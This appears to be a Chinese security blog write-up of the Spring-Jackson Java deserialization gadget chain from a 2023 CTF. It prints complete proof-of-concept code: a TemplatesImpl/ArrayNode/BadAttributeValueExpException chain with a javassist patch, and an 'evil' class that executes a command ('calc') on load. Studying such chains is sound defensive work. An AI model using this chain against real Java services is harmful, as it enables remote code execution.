---
title: JAVA安全:Jackson链（未完待续）
---

*作者：Narcher*	*时间：2024/8/30*	*分类：Vulnerability Analysis*

<!--more-->

## 前言

从网上看了几篇文章，讲的都挺好的，就写一篇做个总结吧



## 正文

### Spring-Jackson原生链

这条链子是23年阿里云CTF bypassit1爆出来的

<img src="JAVA%E5%AE%89%E5%85%A8Jackson%E9%93%BE/image-20240830132003387.png" alt="image-20240830132003387" style="zoom: 67%;" />

基本上依赖都是springboot自带的，硬要自己加的话就加下边这个：

```xml
<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <version>2.13.5</version>
</dependency>
```

我们在正常调用jackson进行序列化的时候会自动调用序列化对象类的getter方法

```java
package jackson
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import jackson.bean.User;

public class Test {
    public static void main(String[] args) throws JsonProcessingException {
        User user = new User();
        System.out.println(user);
        ObjectMapper mapper = new ObjectMapper();
//        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
        String jsonData = mapper.writeValueAsString(user);
        System.out.println(jsonData);
//        User user1 = mapper.readValue(jsonData,User.class);
//        System.out.println(user1);
    }
}
```

其中User类内容如下：

```java
package jackson.bean;
import java.util.Map;

public class User {
    private String name;
    private String age;

    public User() {
        System.out.println("空构造器");
    }

    public Map getGift() {
        System.out.println("getGift");
        return null;
    }

    public String getName() {
        System.out.println("getName");
        return name;
    }

    public void setName(String name) {
        System.out.println("setName");
        this.name = name;
    }

    public String getAge() {
        System.out.println("getAge");
        return age;
    }

    public void setAge(String age) {
        System.out.println("setAge");
        this.age = age;
    }
}
```

输出如下：

<img src="JAVA%E5%AE%89%E5%85%A8Jackson%E9%93%BE/image-20240830133639595.png" alt="image-20240830133639595" style="zoom: 67%;" />

经过调试可以发现是writeValueAsString方法触发的：

<img src="JAVA%E5%AE%89%E5%85%A8Jackson%E9%93%BE/image-20240830133747703.png" alt="image-20240830133747703" style="zoom:50%;" />

而在jackson的库中有一个ArrayNode类，用于表示json数组，并且继承了BaseJsonNode类，而在BaseJsonNode类里对toString方法进行了重写：

<img src="JAVA%E5%AE%89%E5%85%A8Jackson%E9%93%BE/image-20240830134701597.png" alt="image-20240830134701597" style="zoom:67%;" />

<img src="JAVA%E5%AE%89%E5%85%A8Jackson%E9%93%BE/image-20240830134720899.png" alt="image-20240830134720899" style="zoom:67%;" />

相当于调用toString方法就可以导致任意getter的触发

对于可以利用的getter这里，不难想到最常见的TemplatesImpl类的getOutputProperties方法

<img src="JAVA%E5%AE%89%E5%85%A8Jackson%E9%93%BE/image-20240830135456355.png" alt="image-20240830135456355" style="zoom:67%;" />

那么把封装好的TemplatesImpl类放到ArrayNode里，然后再找一个能够触发toString方法且包含readObject方法的类就结束了

而在BadAttributeValueExpException的readObject方法中，则恰好有对toString方法的调用：

<img src="JAVA%E5%AE%89%E5%85%A8Jackson%E9%93%BE/image-20240830135152268.png" alt="image-20240830135152268" style="zoom:50%;" />

在学习CC链的时候我们就见过了，所以说直接用反射把val赋值成ArrayNode就完工了

但如果这样直接会发现在反序列化的时候根本弹不出计算器，反而是在序列化的时候会弹出来，报错显示在序列化的时候调用了BaseJsonNode的writeReplace方法：

<img src="JAVA%E5%AE%89%E5%85%A8Jackson%E9%93%BE/image-20240830142243322.png" alt="image-20240830142243322" style="zoom:67%;" />

<img src="JAVA%E5%AE%89%E5%85%A8Jackson%E9%93%BE/image-20240830144136136.png" alt="image-20240830144136136" style="zoom:67%;" />

而根据序列化的规则：writeReplace方法会在序列化的时候替换掉原有的类型，因此我们在反序列化的时候就不能按正常的逻辑打了

还好这是序列化过程中的，因此我们可以在序列化之前把这个方法给移掉，可以用javassist这个库

之后的完整链子如下：

```java
package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ArrayNode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class jackson1 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NotFoundException, CannotCompileException {
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"a");
        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("C://Users//Narcher//IdeaProjects//evil.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates,codes);
        Field tfactoryField = tc.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());

        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        ctClass0.removeMethod(writeReplace);
        ctClass0.toClass();

        ObjectMapper objectMapper = new ObjectMapper();
        ArrayNode arrayNode = objectMapper.createArrayNode();
        arrayNode.addPOJO(templates);
        BadAttributeValueExpException bad = new BadAttributeValueExpException("1");
        Field fval = BadAttributeValueExpException.class.getDeclaredField("val");
        fval.setAccessible(true);
        fval.set(bad,arrayNode);
        //序列化
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\jackson1.txt"));
        oos.writeObject(bad);
        //反序列化
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("C:\\Users\\Narcher\\IdeaProjects\\jackson1.txt"));
        ois.readObject();
    }
}
```

而evil类如下：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class evil extends AbstractTranslet {
    static {
        try{
            Runtime.getRuntime().exec("calc");
        }catch (IOException e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

